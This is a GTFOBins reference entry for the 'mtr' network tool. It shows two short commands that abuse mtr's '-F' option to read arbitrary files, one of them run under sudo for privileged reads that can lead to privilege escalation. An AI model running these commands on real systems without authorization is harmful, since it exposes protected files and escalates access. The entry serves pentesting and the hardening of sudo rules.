# GTFOBin: mtr

The read file content is corrupted by error prints.

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
mtr --raw -F "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo mtr --raw -F "$LFILE"
```